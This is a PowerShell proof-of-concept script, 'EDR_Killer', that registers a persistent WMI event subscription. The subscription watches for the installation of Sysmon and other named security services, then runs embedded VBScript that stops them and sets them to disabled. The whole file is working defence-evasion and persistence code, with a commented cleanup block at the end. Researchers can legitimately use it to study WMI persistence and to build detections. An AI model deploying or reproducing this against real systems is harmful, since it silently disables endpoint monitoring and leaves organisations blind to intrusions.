# PowerShell 2.0
# Name: EDR_Killer.ps1
# Version: 1.0
# Author: @mgreen27
# Description: Powershell WMI Event Consumer Proof of Concept to disable EDR tools when installed.
# Original Template (Eventlog Consumer) attributed to @mattifestation: https://gist.github.com/mattifestation/aff0cb8bf66c7f6ef44a

# Set Variables
$Name = 'EDR_Killer'
$Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA "Win32_Service" AND (TargetInstance.Name = "Sysmon" OR TargetInstance.Name = "Service name 2" OR TargetInstance.Name = "Service Name ..." OR TargetInstance.Name = "Service name N")'
$Class = 'ActiveScriptEventConsumer'
$Namespace = 'root/subscription'

# Define the signature - i.e. __EventFilter
$EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = $Name
    Query = $Query
    QueryLanguage = 'WQL'
}

$InstanceArgs = @{
    Namespace = $Namespace
    Class = '__EventFilter'
    Arguments = $EventFilterArgs
}

$Filter = Set-WmiInstance @InstanceArgs


# Define the Event Consumer - ACTION
$EventConsumerArgs = @{
    Name = $Name
    ScriptingEngine = 'VBScript'
    ScriptText = '
Dim objWMIService, strQuery, colServiceList, objService, strServiceName
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\localhost\root\cimv2")
strServiceName = TargetEvent.TargetInstance.Name
strQuery = "Select * from Win32_Service where name = " & Chr(34) & strServiceName & Chr(34)
Set  colServiceList = objWMIService.ExecQuery(strQuery)
For Each objService in colServiceList
  If objService.State <> "Stopped" Then
    objService.StopService()
  End If
  If objService.StartMode <> "Disabled" Then
    objService.ChangeStartMode("Disabled")
  End If  
Next
'
}

$InstanceArgs = @{
    Namespace = $Namespace
    Class = $Class
    Arguments = $EventConsumerArgs
}

$Consumer = Set-WmiInstance @InstanceArgs

$FilterConsumerBingingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}

$InstanceArgs = @{
    Namespace = $Namespace
    Class = '__FilterToConsumerBinding'
    Arguments = $FilterConsumerBingingArgs
}

# Register the alert
$Binding = Set-WmiInstance @InstanceArgs



<# Remove EventConsumer
Get-WmiObject -Namespace 'root/subscription' -Class '__EventFilter' | where-object {$_.Name -like "EDR_Killer*"} | Remove-WmiObject
Get-WmiObject -Namespace 'root/subscription' -Class 'ActiveScriptEventConsumer' | where-object {$_.Name -like "EDR_Killer"} | Remove-WmiObject
Get-WmiObject -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' | where-object {$_.Filter -like "*EDR_Killer*"} | Remove-WmiObject
#>